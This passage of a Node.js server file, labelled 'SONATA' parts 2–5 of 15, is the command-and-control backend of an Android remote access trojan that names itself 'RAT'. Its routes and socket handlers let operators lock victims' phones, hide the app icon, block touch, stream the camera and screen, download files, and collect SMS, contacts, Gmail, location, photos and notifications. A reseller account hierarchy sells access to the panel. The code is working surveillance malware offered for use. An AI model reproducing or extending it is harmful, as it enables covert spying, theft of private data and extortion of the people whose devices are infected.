  if(u?.fileName){try{fs.unlinkSync(path.join(UPDATES_DIR,u.fileName))}catch{}}
  const db=loadDatabase(); const meta=db.find(x=>x&&x._meta===true); if(meta){delete meta.appUpdate;saveDatabase(db);}
  res.json({ok:true});
});

// ═══════════════════════════════════════════════════════════════════════
//  RAT IN-MEMORY STATE
// ═══════════════════════════════════════════════════════════════════════
const ratDevices = {};
const ratCameraFrames = {};
const ratControllerSockets = new Set();
const ratPendingFileDownloads = {};

function ratGetDeviceListForUid(uid) {
  if (!uid) return [];
  return Object.values(ratDevices)
    .filter(d => d.uid === uid)
    .map(d => ({
      id: d.id,
      name: d.name,
      uid: d.uid,
      connectedAt: d.connectedAt,
      lastSeen: d.lastSeen,
      info: d.info || {},
      status: d.status || {}
    }));
}

function ratBroadcast(event, data, uid) {
  if (!uid) return;
  ratControllerSockets.forEach(sid => {
    const s = io.sockets.sockets.get(sid);
    if (!s) return;
    if (s.data.uid !== uid) return;
    s.emit(event, data);
  });
}

async function resolveTelegramRole(userId) {
  const cfg = loadTelegramConfig();
  const id = Number(userId);

  if ((cfg.devList || []).map(Number).includes(id) ||
      (cfg.ownerList || []).map(Number).includes(id)) {
    return 'PEMULA';
  }

  let bestRole = null;
  let bestLevel = 0;

  for (const [groupId, roleName] of Object.entries(cfg.groups || {})) {
    try {
      const member = await bot.getChatMember(Number(groupId), id);
      if (['member','restricted','administrator','creator'].includes(member.status)) {
        const roleKey = String(roleName).toLowerCase();
        const level = ROLE_LEVEL[roleKey] || 0;
        if (level > bestLevel) {
          bestLevel = level;
          bestRole = roleKey;
        }
      }
    } catch (_) {}
  }

  return bestRole ? bestRole.toUpperCase() : null;
}

function resolveRoleSync(userId) {
  const cfg = loadTelegramConfig();
  const id = Number(userId);
  if ((cfg.devList || []).map(Number).includes(id) ||
      (cfg.ownerList || []).map(Number).includes(id)) {
    return 'PEMULA';
  }
  return null;
}

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 2/15");
console.log("    STATUS : ROLE + GROUP ROLE + BERKAH CONFIG OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  SONATA— v2 FULL EDITION
//  Part 3/15: RAT HTTP ROUTES
// ═══════════════════════════════════════════════════════════════════════

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: 'Username Dan Password Wajib Diisi' });
  }

  const db = loadDatabase();
  const raw = String(username).trim();
  const keyLower = raw.toLowerCase();

  const user = db.find(u => u.username === raw || u.username.toLowerCase() === keyLower);
  if (!user) return res.status(401).json({ error: 'Username tidak terdaftar' });
  rememberUserIdentity(user, 'LOGIN');
  if (String(user.password) !== String(password)) {
    return res.status(401).json({ error: 'Password salah' });
  }

  if (user.expiredDate && new Date(user.expiredDate) < new Date()) {
    return res.status(401).json({ error: 'Akun expired' });
  }

  if (!user.uid) {
    user.uid = crypto.createHash('md5').update(user.username).digest('hex');
    saveDatabase(db);
  }
  if (!user.role) {
    user.role = 'member';
    saveDatabase(db);
  }

  const token = ratGenToken();
  ratSessions[token] = { username: user.username, uid: user.uid };

  res.json({
    ok: true,
    token,
    username: user.username,
    role: user.role,
    uid: user.uid
  });
});

// ─── FIX: /api/logout hapus activeKeys juga ──────────────────────────
app.post('/api/logout', ratRequireAuth, (req, res) => {
  const token = req.headers['x-auth-token'];
  delete ratSessions[token];
  delete activeKeys[token];
  try {
    const list = loadKeyList();
    const filtered = list.filter(e => e.sessionKey !== token);
    if (filtered.length !== list.length) saveKeyList(filtered);
  } catch (_) {}
  res.json({ ok: true });
});

app.get('/api/me', ratRequireAuth, (req, res) => {
  const db = loadDatabase();
  const user = db.find(u => u.username === req.username);
  if (!user) return res.status(404).json({ error: 'Account not found' });
  res.json({
    username: user.username,
    displayName: user.username,
    role: user.role || 'member',
    uid: user.uid || '',
    trialExpiry: user.expiredDate || null
  });
});

app.post('/api/change-password', ratRequireAuth, (req, res) => {
  const { oldPassword, newPassword } = req.body;
  if (!oldPassword || !newPassword) {
    return res.status(400).json({ error: 'Semua field wajib diisi' });
  }
  if (newPassword.length < 6) {
    return res.status(400).json({ error: 'Password baru minimal 6 karakter' });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === req.username);
  if (!user) return res.status(404).json({ error: 'Akun tidak ditemukan' });
  if (user.password !== oldPassword) {
    return res.status(401).json({ error: 'Password lama salah' });
  }

  user.password = newPassword;
  saveDatabase(db);
  res.json({ ok: true });
});

app.get('/api/devices', ratRequireAuth, (req, res) => {
  res.json(ratGetDeviceListForUid(req.uid));
});

// ─── FIX: /api/command ACK + timeout, jangan balas ok:true sebelum agent konfirmasi ───
app.post('/api/command/:deviceId', ratRequireAuth, (req, res) => {
  const { deviceId } = req.params;
  const { command, value } = req.body;

  if (!ratDevices[deviceId]) {
    return res.status(404).json({ error: 'Device Not Found' });
  }
  if (ratDevices[deviceId].uid !== req.uid) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const agentSocketId = ratDevices[deviceId].socketId;
  const agentSocket = io.sockets.sockets.get(agentSocketId);
  if (!agentSocket) {
    return res.status(409).json({ error: 'Agent socket tidak aktif. Coba refresh device.' });
  }

  if (command === 'lockDevice') {
    try {
      const parsed = typeof value === 'string' ? JSON.parse(value) : value;
      ratDevices[deviceId].status.deviceLocked = true;
      ratDevices[deviceId].status.lockTitle = parsed.title || '';
    } catch (_) {}
  } else if (command === 'unlockDevice') {
    ratDevices[deviceId].status.deviceLocked = false;
    ratDevices[deviceId].status.lockTitle = '';
  } else if (command === 'flashlight') {
    ratDevices[deviceId].status.flashlight = (value === 'true');
  } else if (command === 'camera') {
    ratDevices[deviceId].status.cameraActive = (value !== 'off');
  } else if (command === 'screen') {
    ratDevices[deviceId].status.screenActive = (value === 'start');
  } else if (command === 'hideIcon') {
    ratDevices[deviceId].status.iconHidden = (value === 'true');
  } else if (command === 'muteVolume') {
    ratDevices[deviceId].status.volumeMuted = (value === 'true');
  } else if (command === 'touchBlock') {
    ratDevices[deviceId].status.touchBlocked = true;
  } else if (command === 'touchBlockStop') {
    ratDevices[deviceId].status.touchBlocked = false;
  } else if (command === 'ttsSpeak') {
    ratDevices[deviceId].status.ttsSpeaking = true;
  } else if (command === 'ttsStop') {
    ratDevices[deviceId].status.ttsSpeaking = false;
  } else if (command === 'dialogSpam') {
    ratDevices[deviceId].status.dialogSpamActive = true;
  } else if (command === 'dialogSpamStop') {
    ratDevices[deviceId].status.dialogSpamActive = false;
  } else if (command === 'videoOverlay') {
    ratDevices[deviceId].status.videoOverlayActive = true;
  } else if (command === 'videoOverlayHide') {
    ratDevices[deviceId].status.videoOverlayActive = false;
  } else if (command === 'jumpscareStart') {
    ratDevices[deviceId].status.jumpscareActive = true;
    ratDevices[deviceId].status.jumpscareUrl = value;
  } else if (command === 'jumpscareStop') {
    ratDevices[deviceId].status.jumpscareActive = false;
  } else if (command === 'jumpscare2Start') {
    try {
      const obj = typeof value === 'string' ? JSON.parse(value) : value;
      ratDevices[deviceId].status.jumpscare2Active = true;
      ratDevices[deviceId].status.jumpscare2Url = obj.url || '';
      ratDevices[deviceId].status.jumpscare2Duration = obj.duration || 3000;
    } catch (_) {}
  } else if (command === 'jumpscare2Stop') {
    ratDevices[deviceId].status.jumpscare2Active = false;
  } else if (command === 'blockApp') {
    try {
      const obj = typeof value === 'string' ? JSON.parse(value) : value;
      const arr = ratDevices[deviceId].status.blockedApps || [];
      if (!arr.includes(obj.package)) arr.push(obj.package);
      ratDevices[deviceId].status.blockedApps = arr;
    } catch (_) {}
  } else if (command === 'unblockApp') {
    const arr = ratDevices[deviceId].status.blockedApps || [];
    ratDevices[deviceId].status.blockedApps = arr.filter(p => p !== value);
  } else if (command === 'unblockAll') {
    ratDevices[deviceId].status.blockedApps = [];
  }

  ratBroadcast('devices:update', ratGetDeviceListForUid(req.uid), req.uid);

  const reqId = crypto.randomBytes(8).toString('hex');
  let settled = false;

  const respond = (ok, message) => {
    if (settled) return;
    settled = true;
    delete ratPendingCommands[reqId];
    if (ok) {
      res.json({ ok: true, command, reqId });
    } else {
      res.status(504).json({ ok: false, error: message || 'Agent tidak merespons', reqId });
    }
  };

  ratPendingCommands[reqId] = respond;

  io.to(`device:${deviceId}`).emit('command', { command, value, reqId });

  setTimeout(() => {
    if (!settled) {
      console.warn(`[RAT] Command '${command}' timeout ke ${deviceId}`);
      respond(false, 'Timeout: agent tidak merespons');
    }
  }, 8000);
});

app.get('/api/screenshot/:deviceId', ratRequireAuth, (req, res) => {
  const { deviceId } = req.params;
  if (!ratDevices[deviceId]) {
    return res.status(404).json({ error: 'Device Not Found' });
  }
  if (ratDevices[deviceId].uid !== req.uid) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const frame = ratCameraFrames[deviceId];
  if (!frame) {
    return res.status(404).json({ error: 'Belum ada frame. Nyalakan Live Camera dulu!' });
  }

  res.json({ ok: true, frame, deviceId });
});

app.get('/api/file/:deviceId', ratRequireAuth, (req, res) => {
  const { deviceId } = req.params;
  const filePath = req.query.path;

  if (!filePath) return res.status(400).json({ error: 'path diperlukan' });
  if (!ratDevices[deviceId]) return res.status(404).json({ error: 'Device Not Found' });
  if (ratDevices[deviceId].uid !== req.uid) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const agentSocketId = ratDevices[deviceId].socketId;
  if (!io.sockets.sockets.get(agentSocketId)) {
    return res.status(409).json({ error: 'Agent socket tidak aktif.' });
  }

  const reqId = crypto.randomBytes(8).toString('hex');
  const filename = filePath.split('/').pop() || 'file';

  let settled = false;
  ratPendingFileDownloads[reqId] = (err, buf, mime) => {
    if (settled) return;
    settled = true;
    delete ratPendingFileDownloads[reqId];

    if (err) return res.status(500).json({ error: err });

    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`);
    res.setHeader('Content-Type', mime || 'application/octet-stream');
    res.send(buf);
  };

  io.to(`device:${deviceId}`).emit('command', {
    command: 'downloadFile',
    value: JSON.stringify({ path: filePath, reqId })
  });

  setTimeout(() => {
    if (!settled) {
      settled = true;
      delete ratPendingFileDownloads[reqId];
      res.status(504).json({ error: 'Timeout: device tidak merespons' });
    }
  }, 30000);
});

app.get('/api/admin/quota', ratRequireAuth, (req, res) => {
  const myRole = ratGetRole(req.username);
  if (myRole === 'pemula') {
    return res.json({ unlimited: true });
  }

  const allowed = CAN_CREATE_ROLES[myRole] || [];
  const result = {};
  allowed.forEach(targetRole => {
    const limit = ratGetQuotaLimit(req.username, targetRole);
    const used = ratGetQuotaUsed(req.username, targetRole);
    result[targetRole] = { used, limit, remaining: limit - used };
  });

  res.json({ unlimited: false, quota: result });
});

app.post('/api/admin/create-account', ratRequireAuth, (req, res) => {
  const myRole = ratGetRole(req.username);
  const { username, password, role, trialDuration, day } = req.body;

  if (!username || !password || !role) {
    return res.status(400).json({ error: 'Username, password, dan role wajib diisi' });
  }

  const roleKey = String(role).toLowerCase();
  if (!ROLE_HIERARCHY.includes(roleKey)) {
    return res.status(400).json({ error: 'Role tidak valid' });
  }

  if (CANNOT_CREATE_ROLES.includes(myRole)) {
    return res.status(403).json({ error: `Role "${myRole}" tidak diizinkan membuat akun` });
  }

  const allowed = CAN_CREATE_ROLES[myRole] || [];
  if (!allowed.includes(roleKey)) {
    return res.status(403).json({ error: `Role "${myRole}" tidak diizinkan membuat role "${roleKey}"` });
  }

  if (myRole !== 'pemula') {
    const limit = ratGetQuotaLimit(req.username, roleKey);
    const used = ratGetQuotaUsed(req.username, roleKey);
    if (used >= limit) {
      return res.status(403).json({ error: `Quota habis! Kamu sudah membuat ${used}/${limit} akun role "${roleKey}"` });
    }
  }

  const db = loadDatabase();
  const key = String(username).trim();

  if (!key || key.length < 3) {
    return res.status(400).json({ error: 'Username minimal 3 karakter' });
  }

  if (db.find(u => u.username === key)) {
    return res.status(409).json({ error: `Akun "${key}" sudah ada` });
  }

  const newUid = crypto.createHash('md5').update(key).digest('hex');
  const finalDuration = trialDuration || 'permanent';
  const trialExpiry = getTrialExpiry(finalDuration);

  let expiredDate;
  if (trialExpiry) {
    expiredDate = new Date(trialExpiry).toISOString().split("T")[0];
  } else {
    const exp = new Date();
    exp.setFullYear(exp.getFullYear() + 10);
    expiredDate = exp.toISOString().split("T")[0];
  }

  const newAccount = {
    username: key,
    password,
    role: roleKey,
    uid: newUid,
    createdBy: req.username,
    createdAt: new Date().toISOString(),
    trialDuration: finalDuration,
    trialExpiry,
    expiredDate
  };
  db.push(newAccount);
  saveDatabase(db);
  void notifyAccountCreated(newAccount, 'APK');

  console.log(`•SONATA• Akun baru: ${key} (${roleKey}) oleh ${req.username}`);

  res.json({
    ok: true,
    uid: newUid,
    username: key,
    displayName: key,
    role: roleKey,
    trialDuration: finalDuration,
    trialExpiry,
    expiredDate
  });
});

app.get('/api/admin/accounts', ratRequireAuth, (req, res) => {
  const myRole = ratGetRole(req.username);
  const db = loadDatabase();
  const myLevel = ROLE_LEVEL[myRole] || 0;

  const list = db
    .filter(u => {
      if (myRole === 'pemula') return true;
      const accRole = (u.role || 'member').toLowerCase();
      const accLevel = ROLE_LEVEL[accRole] || 0;
      return accLevel < myLevel || u.username === req.username;
    })
    .map(u => ({
      username: u.username,
      displayName: u.username,
      role: u.role || 'member',
      uid: u.uid || '-',
      createdBy: u.createdBy || '-',
      createdAt: u.createdAt || null,
      trialDuration: u.trialDuration || 'permanent',
      trialExpiry: u.trialExpiry || null,
      expiredDate: u.expiredDate || null
    }));

  res.json(list);
});

app.delete('/api/admin/accounts/:username', ratRequireAuth, (req, res) => {
  const myRole = ratGetRole(req.username);
  const targetUser = req.params.username.trim();

  if (targetUser === req.username) {
    return res.status(400).json({ error: 'Tidak bisa menghapus akun sendiri' });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === targetUser);
  if (idx === -1) {
    return res.status(404).json({ error: 'Akun tidak ditemukan' });
  }

  const targetRole = (db[idx].role || 'member').toLowerCase();
  const myLevel = ROLE_LEVEL[myRole] || 0;
  const targetLevel = ROLE_LEVEL[targetRole] || 0;

  if (myLevel <= targetLevel) {
    return res.status(403).json({
      error: `Role "${myRole}" tidak bisa menghapus akun dengan role "${targetRole}"`
    });
  }

  db.splice(idx, 1);
  saveDatabase(db);

  let kicked = 0;
  for (const [tok, sess] of Object.entries(ratSessions)) {
    if (sess.username === targetUser) { delete ratSessions[tok]; kicked++; }
  }
  for (const [tok, info] of Object.entries(activeKeys)) {
    if (info && info.username === targetUser) { delete activeKeys[tok]; kicked++; }
  }

  console.log(`\x1b[33m[ADMIN]\x1b[0m Akun dihapus: ${targetUser} (${targetRole}) oleh ${req.username}`);
  res.json({ ok: true, kicked });
});

app.patch('/api/admin/accounts/:username/role', ratRequireAuth, (req, res) => {
  const myRole = ratGetRole(req.username);
  const targetUser = req.params.username.trim();
  const { role: newRole } = req.body;
  const newRoleKey = String(newRole || '').toLowerCase();

  if (!newRoleKey || !ROLE_HIERARCHY.includes(newRoleKey)) {
    return res.status(400).json({ error: 'Role tidak valid' });
  }

  if (targetUser === req.username) {
    return res.status(400).json({ error: 'Tidak bisa mengubah role sendiri' });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === targetUser);
  if (!user) {
    return res.status(404).json({ error: 'Akun tidak ditemukan' });
  }

  const targetRole = (user.role || 'member').toLowerCase();
  const myLevel = ROLE_LEVEL[myRole] || 0;
  const targetLevel = ROLE_LEVEL[targetRole] || 0;
  const newLevel = ROLE_LEVEL[newRoleKey] || 0;

  if (myLevel <= targetLevel || myLevel <= newLevel) {
    return res.status(403).json({ error: 'Tidak punya izin mengubah role ini' });
  }

  user.role = newRoleKey;
  saveDatabase(db);

  console.log(`\x1b[36m[ADMIN]\x1b[0m Role diubah: ${targetUser} ${targetRole}→${newRoleKey} oleh ${req.username}`);
  res.json({ ok: true, username: targetUser, oldRole: targetRole, newRole: newRoleKey });
});

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 3/15");
console.log("    STATUS : RAT HTTP ROUTES + ACK + LOGOUT FIX OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
// ═══════════════════════════════════════════════════════════════════════
//  Part 4/15: SOCKET.IO HANDLER + WSS CHAT
// ═══════════════════════════════════════════════════════════════════════

// ─── FIX: socket middleware validasi token dari handshake.auth ──────
io.use((socket, next) => {
  const token = socket.handshake?.auth?.token;
  if (!token) {
    socket.data.authed = false;
    return next();
  }
  if (!ratSessions[token] && !activeKeys[token]) {
    return next(new Error('auth:invalid'));
  }
  socket.data.authed = true;
  socket.data.token = token;
  next();
});

io.on('connection', (socket) => {

  socket.on('controller:join', (data) => {
    const token = data?.token;
    if (!token || (!ratSessions[token] && !activeKeys[token])) {
      socket.emit('auth:error', { message: 'Unauthorized' });
      socket.disconnect();
      return;
    }

    let username, uid;
    if (ratSessions[token]) {
      username = ratSessions[token].username;
      uid = ratSessions[token].uid || '';
    } else {
      username = activeKeys[token].username;
      const db = loadDatabase();
      const user = db.find(u => u.username === username);
      uid = user?.uid || crypto.createHash('md5').update(username).digest('hex');
    }

    socket.data.uid = uid;
    socket.data.username = username;
    ratControllerSockets.add(socket.id);

    socket.emit('devices:update', ratGetDeviceListForUid(uid));
  });

  socket.on('device:register', (data) => {
    const { deviceId, name, battery, charging, sdkVersion, androidVersion, uid } = data;

    const existing = ratDevices[deviceId];
    const sameUid = existing && existing.uid === (uid || '');

    ratDevices[deviceId] = {
      uid: uid || '',
      id: deviceId,
      name: name || 'Unknown Device',
      socketId: socket.id,
      connectedAt: existing?.connectedAt || new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      info: {
        battery: battery ?? -1,
        charging: charging ?? false,
        sdkVersion: sdkVersion ?? -1,
        androidVersion: androidVersion ?? '?'
      },
      status: sameUid && existing.status ? existing.status : {
        flashlight: false, cameraActive: false, screenActive: false,
        deviceLocked: false, lockTitle: '',
        jumpscareActive: false, jumpscareUrl: '',
        jumpscare2Active: false, jumpscare2Url: '', jumpscare2Duration: 3000,
        blockedApps: [], iconHidden: false, volumeMuted: false,
        touchBlocked: false, ttsSpeaking: false,
        dialogSpamActive: false, videoOverlayActive: false
      }
    };

    socket.join(`device:${deviceId}`);
    ratBroadcast('devices:update', ratGetDeviceListForUid(uid || ''), uid || '');

    const db = loadDatabase();
    const owner = db.find(u => {
      const uUid = u.uid || crypto.createHash('md5').update(u.username).digest('hex');
      return uUid === uid;
    });
    const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false });

    console.log(`\x1b[32m\n╔══════════════════════════════════╗`);
    console.log(`║      NEW DEVICE CONNECTED        ║`);
    console.log(`╚══════════════════════════════════╝\x1b[0m`);
    console.log(`\x1b[36m  Name    :\x1b[0m ${name || 'Unknown'}`);
    console.log(`\x1b[36m  Owner   :\x1b[0m ${owner ? owner.username : 'Unknown'}`);
    console.log(`\x1b[36m  Battery :\x1b[0m ${battery ?? '?'}% ${charging ? '(Charging)' : ''}`);
    console.log(`\x1b[36m  Android :\x1b[0m ${androidVersion ?? '?'} (SDK ${sdkVersion ?? '?'})`);
    console.log(`\x1b[36m  ID      :\x1b[0m ${deviceId}`);
    console.log(`\x1b[36m  Time    :\x1b[0m ${time}`);
    console.log(`\x1b[32m──────────────────────────────────\x1b[0m\n`);

    const pingInterval = setInterval(() => {
      if (ratDevices[deviceId] && ratDevices[deviceId].socketId === socket.id) {
        io.to(`device:${deviceId}`).emit('ping:keepalive');
      } else {
        clearInterval(pingInterval);
      }
    }, 25000);

    socket.on('disconnect', () => clearInterval(pingInterval));
  });

  socket.on('device:ack', (data) => {
    const { reqId, ok, message } = data || {};
    if (!reqId) return;
    const respond = ratPendingCommands[reqId];
    if (respond) {
      respond(ok !== false, message || null);
    }
  });

  socket.on('device:status', (data) => {
    const { deviceId, status } = data;
    if (!ratDevices[deviceId]) return;

    if (status.installedApps) {
      ratBroadcast('apps:list', { deviceId, apps: status.installedApps }, ratDevices[deviceId].uid);
      delete status.installedApps;
    }
    if (status.notifList) {
      ratBroadcast('notif:list', { deviceId, list: status.notifList }, ratDevices[deviceId].uid);
      delete status.notifList;
    }
    if (status.smsList) {
      ratBroadcast('sms:list', { deviceId, list: status.smsList }, ratDevices[deviceId].uid);
      delete status.smsList;
    }

    ratDevices[deviceId].status = { ...ratDevices[deviceId].status, ...status };
    ratDevices[deviceId].lastSeen = new Date().toISOString();
    ratBroadcast('devices:update', ratGetDeviceListForUid(ratDevices[deviceId].uid), ratDevices[deviceId].uid);
    ratBroadcast(`status:${deviceId}`, ratDevices[deviceId].status, ratDevices[deviceId].uid);
  });

  socket.on('device:notif', (data) => {
    const dev = ratDevices[data.deviceId];
    if (dev) ratBroadcast('device:notif', data, dev.uid);
  });

  socket.on('camera:frame', (data) => {
    const { deviceId, frame } = data;
    ratCameraFrames[deviceId] = frame;
    if (ratDevices[deviceId]) {
      ratBroadcast('camera:frame', { deviceId, frame }, ratDevices[deviceId].uid);
    }
  });

  socket.on('screen:frame', (data) => {
    const { deviceId, frame } = data;
    if (ratDevices[deviceId]) {
      ratBroadcast('screen:frame', { deviceId, frame }, ratDevices[deviceId].uid);
    }
  });

  socket.on('camera:screenshot', (data) => {
    const { deviceId, frame, facing } = data;
    if (ratDevices[deviceId]) {
      ratBroadcast('camera:screenshot', { deviceId, frame, facing }, ratDevices[deviceId].uid);
    }
  });

  socket.on('device:gallery', (data) => {
    const { deviceId, photos } = data;
    if (ratDevices[deviceId]) {
      ratBroadcast('device:gallery', { deviceId, photos }, ratDevices[deviceId].uid);
    }
  });

  socket.on('device:location', (data) => {
    if (ratDevices[data.deviceId]) {
      ratBroadcast('device:location', data, ratDevices[data.deviceId].uid);
    }
  });

  socket.on('device:contacts', (data) => {
    if (ratDevices[data.deviceId]) {
      ratBroadcast('device:contacts', data, ratDevices[data.deviceId].uid);
    }
  });

  socket.on('device:gmail', (data) => {
    if (ratDevices[data.deviceId]) {
      ratBroadcast('device:gmail', data, ratDevices[data.deviceId].uid);
    }
  });

  socket.on('device:phone', (data) => {
    if (ratDevices[data.deviceId]) {
      ratBroadcast('device:phone', data, ratDevices[data.deviceId].uid);
    }
  });

  socket.on('device:files', (data) => {
    if (ratDevices[data.deviceId]) {
      ratBroadcast('device:files', data, ratDevices[data.deviceId].uid);
    }
  });

  socket.on('device:filedata', (data) => {
    const { reqId, error, base64, mime } = data;
    if (!reqId || !ratPendingFileDownloads[reqId]) return;

    if (error) {
      ratPendingFileDownloads[reqId](error);
    } else {
      const buf = Buffer.from(base64, 'base64');
      ratPendingFileDownloads[reqId](null, buf, mime || 'application/octet-stream');
    }
  });

  socket.on('device:themeChanged', (data) => {
    if (ratDevices[data.deviceId]) {
      ratBroadcast('device:themeChanged', data, ratDevices[data.deviceId].uid);
    }
  });

  socket.on('disconnect', () => {
    ratControllerSockets.delete(socket.id);
    const socketUid = socket.data.uid || '';

    for (const id in ratDevices) {
      if (ratDevices[id].socketId === socket.id) {
        const deviceUid = ratDevices[id].uid || socketUid;
        const deviceName = ratDevices[id].name || 'Unknown';
        const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false });

        console.log(`\x1b[31m\n╔══════════════════════════════════╗`);
        console.log(`║      DEVICE DISCONNECTED         ║`);
        console.log(`╚══════════════════════════════════╝\x1b[0m`);
        console.log(`\x1b[33m  Name    :\x1b[0m ${deviceName}`);
        console.log(`\x1b[33m  ID      :\x1b[0m ${id}`);
        console.log(`\x1b[33m  Time    :\x1b[0m ${time}`);
        console.log(`\x1b[31m──────────────────────────────────\x1b[0m\n`);

        delete ratCameraFrames[id];
        delete ratDevices[id];
        ratBroadcast('devices:update', ratGetDeviceListForUid(deviceUid), deviceUid);
        break;
      }
    }

    if (socketUid) {
      ratBroadcast('devices:update', ratGetDeviceListForUid(socketUid), socketUid);
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════
//  RAW WEBSOCKET HANDLER (CHAT + STATS)
// ═══════════════════════════════════════════════════════════════════════

wss.on('connection', function (ws, req) {
  let username;

  function broadcastStats() {
    const stats = JSON.stringify({
      type: 'stats',
      onlineUsers: onlineUsers.size,
      activeConnections: wss.clients.size,
    });
    wss.clients.forEach((client) => {
      if (client.readyState === 1) {
        client.send(stats);
      }
    });
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'stats') {
        broadcastStats();
      }

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({ type: "forceLogout", reason: "Invalid key" }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({ type: "forceLogout", reason: "Another device has logged in" }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        const validId = session.find(e => e.androidId === data.androidId);

        if (!validKey) {
          ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "keyInvalid" }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "androidIdMismatch" }));
          return ws.close();
        }

        const userInfo = session.find(e => e.sessionKey === data.key);
        ws.username = userInfo?.username || data.key;
        markOnline(ws.username, userInfo?.role || 'member');
        broadcastStats();

        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: userInfo?.username,
          androidId: userInfo?.androidId,
          role: userInfo?.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key);
          const validId = session.find(e => e.androidId === data.androidId);

          if (!validKey) {
            ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "keyInvalid" }));
            clearInterval(interval);
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({ type: "myInfo", valid: false, reason: "androidIdMismatch" }));
            clearInterval(interval);
            return ws.close();
          }
        }, 10000);

        ws.interval = interval;
      }

      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        if (!username) return ws.close();
        wsClients[username] = ws;

        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (ws.username) {
      onlineUsers.delete(ws.username);
      broadcastStats();
    }
    if (ws.interval) clearInterval(ws.interval);
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
console.log("    SONATA V1 — PART 4/15");
console.log("    STATUS : SOCKET.IO + WSS + ACK + UID FILTER FIX OK");
console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

// ═══════════════════════════════════════════════════════════════════════
//  Part 5/15: AUTH FLUTTER ROUTES
// ═══════════════════════════════════════════════════════════════════════

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    if (existingSession.androidId !== androidId) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${existingSession.androidId} | Device Baru: ${androidId}`);
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  if (!user.uid) {
    user.uid = crypto.createHash('md5').update(user.username).digest('hex');
    saveDatabase(db);
  }
  if (!user.role) {
    user.role = 'member';
    saveDatabase(db);
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  ratSessions[key] = { username: user.username, uid: user.uid };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    uid: user.uid,
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
